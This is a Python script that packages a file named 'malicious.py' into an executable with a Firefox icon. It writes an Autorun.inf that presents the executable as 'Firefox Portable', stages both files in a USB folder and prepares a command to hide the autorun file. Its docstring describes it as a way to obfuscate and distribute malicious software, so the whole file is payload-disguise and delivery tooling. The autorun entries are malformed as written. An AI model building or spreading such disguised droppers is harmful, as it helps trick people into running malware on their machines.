import PyInstaller.__main__
import shutil
import os


def run_installer():
    """
    The Autorun file was available for older Windows versions (Windows 95 through Windows XP) but has since been disabled to prevent removable media from running malware.

    https://pyinstaller.org/en/stable/usage.html

    This function shows how pyinstaller can be used to help obfuscate & distribute nasty software.
    1. take a file with a hidden agenda (e.g "./malicious.py")
    2. creating an exe with it
    3. remove any post-generated folders + files
    4. creating an autorun file
    5. runs the new file, which was the original python file from step 1

    End result is a USB folder, with 2 files. 1 generated exe and 1 hidden Autorun.inf file.
    """
    filename = "malicious.py"
    exename = "run_me"
    icon = "Firefox.ico"
    pwd = os.getcwd()
    usbdir = os.path.join(pwd, "USB")

    if os.path.isfile(exename):
        os.remove(exename)

    print("creating exe")

    PyInstaller.__main__.run(
        [filename, "--onefile", "--clean", "--name=" + exename, "--icon=" + icon]
    )

    print("exe created")

    shutil.move(os.path.join(pwd, "dist", exename), pwd)

    if os.path.isdir("dist"):
        print("deleting dist/")
        shutil.rmtree("dist")
    if os.path.isdir("build"):
        print("deleting build/")
        shutil.rmtree("build")
    if os.path.isdir("__pycache__"):
        print("deleting __pycache__/")
        shutil.rmtree("__pycache__")
    os.remove(exename + ".spec")

    print("creating autorun file")

    with open("Autorun.inf", "w") as o:
        o.write("(Autorun)\n")
        o.write("Open-" + exename + "\n")
        o.write("Action-Start Firefox Portable\n")
        o.write("Label-My USB\n")
        o.write("Icon-" + exename + "\n")

    print("setting up usb")

    shutil.move(exename, usbdir)
    shutil.move("Autorun.inf", usbdir)
    print("attrib +h " + os.path.join(usbdir, "Autorun.inf"))
    # os.system("attrib +h " + os.path.join(usbdir, "Autorun.inf"))


run_installer()